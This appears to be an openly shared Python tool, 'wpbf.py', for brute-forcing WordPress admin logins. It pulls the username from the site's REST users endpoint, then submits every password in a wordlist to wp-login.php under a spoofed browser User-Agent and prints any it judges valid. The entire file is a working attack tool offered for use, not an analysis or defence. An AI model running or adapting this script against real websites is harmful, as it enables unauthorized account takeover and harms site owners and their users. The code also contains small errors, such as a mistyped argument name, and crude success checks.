#Make Original By Kenzawa/babwa
#U can recode this source code because is an a open source
#Thanks

import requests
from  colorama import Fore
import time
import argparse
import sys

b = '\033[1m'+Fore.LIGHTBLUE_EX
red = '\033[1m'+Fore.LIGHTRED_EX
g = '\033[1m'+Fore.LIGHTGREEN_EX
c = '\033[1m'+Fore.LIGHTCYAN_EX
w = '\033[1m'+Fore.LIGHTWHITE_EX

error = ['incorrect', 'Incorrect', 'Error', 'Invalid']

header = {'User-Agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36'}
def getUrl(url):
    urls = []
    with open(url, "r") as ufile:
        allurl = ufile.readlines()
        for i in range(len(allurl)):
            urls.append(allurl[i].strip('\n'))
        return urls
class FindUser:
    def __init__(self, url: str):
        target = url
        target = target.replace('https://', '')
        target = target.replace('http://', '')
        tar_list = target.split('/')[0]
        url = 'http://' + tar_list
        resp = requests.get(url + '/wp-json/wp/v2/users/1', headers=header)
        try:
            uname = resp.json()['name']
            slug = resp.json()['slug']
            self.uname = uname
            hasil = 'slug: '+slug + ' ==> ' +'username: ' + uname
            self.hasil = hasil
        except:
            exit('please input the username because tools can\'t detect usename. maybe any html comment')
ada = []
def wpbf(url: str, usr='a', pw='a', path='/wp-login.php'):
    target = url
    target = target.replace('https://', '')
    target = target.replace('http://', '')
    tar_list = target.split('/')[0]
    url = 'https://' + tar_list +'/'+ path
    
    if pw == 'a':
        garis = open('wordlist.txt','r').read().splitlines()
        print(c+'using default wordlist '+ str(len(garis))+' word')
        pw1 = getUrl('wordlist.txt')
    else:
        pw1 = getUrl(pw)
        garis = open(pw,'r').read().splitlines()
    if usr == 'a':
        usr = FindUser(url).uname
        print(f'{red}You Not Input Username, automatic input username')
        time.sleep(1)
        print(w+"Searching username")
        print(c+"UserName: "+usr+'\n')
    else:
        usr = usr
    print('WPBF In: '+url)
    count = 0
    for wl in pw1:

        data = {'log': usr,
        'pwd': wl, 
        'wp-submit': 'Log In', 
        'testcookie': '1', 
        'redirect_to' : ''
        }
        
        try:
            r = requests.post(url, data=data, allow_redirects=True, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'Cookie': 'wordpress_test_cookie=WP Cookie check'})
        except:
            url = 'http://' + tar_list +'/'+ path
            r = requests.post(url, data=data, allow_redirects=True, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'Cookie': 'wordpress_test_cookie=WP Cookie check'})
        dataa = r.text
        if r.status_code == 404:
            if 'reset-password' in r.text:
            	exit('Imunify ALert')
            else:
            	exit('\nURL NOT FOUND - STATUS CODE: 404')
            
        count += 1
        if count > len(garis):
              print("\n"+target + " Is Done")
        sys.stdout.write(f'\r{w}Progress: {count}/{len(garis)}')
        time.sleep(0.01)
        if 'Error' in dataa or 'Incorrect' in dataa or 'Invalid' in dataa or 'ERROR' in dataa:
            pass
        else:
            hasil ='\n' + c + wl + ' Is Valid'
            ada.append(hasil)
            print(hasil)
    print(b+"\n===========RESULT==========\n")
    for adaa in ada:
        print(adaa)

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', metavar='url', help='Put Url')
parser.add_argument('-un', '--username', metavar='UserName', help='Put username, if you not have a username. Use: wpbf.py -su <url> or use automatic search username')
parser.add_argument('-P', '--password', metavar='WordList', help='put password list. default: wordlist.txt - Note: default password is 3106 word')
parser.add_argument('-su', '--search', metavar='Find Username', help='Find Username')
parser.add_argument('-pl', '--PathLogin', metavar='path login', help='default: site.com/wp-login.php')
args = parser.parse_args()

if args.url:
    if args.password:
        if args.username:
            if args.PathLogin:
                wpbf(args.url, args.username, args.password, args.PathLogin)
            else:
                wpbf(args.url, args.username, args.password)
        elif args.PathLogin:
            if args.username:
                wpbf(args.url, args.username, args.password, args.PathLogin)
            else:
                wpbf(args.url, pw=args.password, path=args.PathLogin)
        else:
            wpbf(args.url,pw=args.password)
    elif args.username:
        if args.password:
            if args.Pathlogin:
                wpbf(args.url, args.username, args.password, args.PathLogin)
            else:
                wpbf(args.url, args.username, args.password)
        elif args.PathLogin:
            if args.password:
                wpbf(args.url, args.username, args.password, args.PathLogin)
            else:
                wpbf(args.url, usr=args.username, path=args.PathLogin)
        else:
            wpbf(args.url, args.username)
    elif args.PathLogin:
        if args.username:
            if args.password:
                wpbf(args.url, usr=args.username, pw=args.password, path=args.PathLogin)
            else:
                wpbf(args.url, usr=args.username, path=args.PathLogin)
        elif args.password:
            if args.username:
                wpbf(args.url, usr=args.username, pw=args.password, path=args.PathLogin)
            else:
                wpbf(args.url, pw=args.password, path=args.PathLogin)
        else:
            wpbf(args.url, path=args.PathLogin)
    else:
        wpbf(args.url)
elif args.search:
    print(FindUser(args.search).hasil)
elif args.password:
    print("You Should Use -u <url> -P <file to list>")
elif args.username:
    print("You Should Use -u <url> -un <username>")
elif args.PathLogin:
    print("You Should Use -u <url> -pl <path to login>")
else:
    print('usage: wpbf.py [-h] [-u url [-un UserName] [-P WordList] [-su Find Username] [-pl path login]] ')
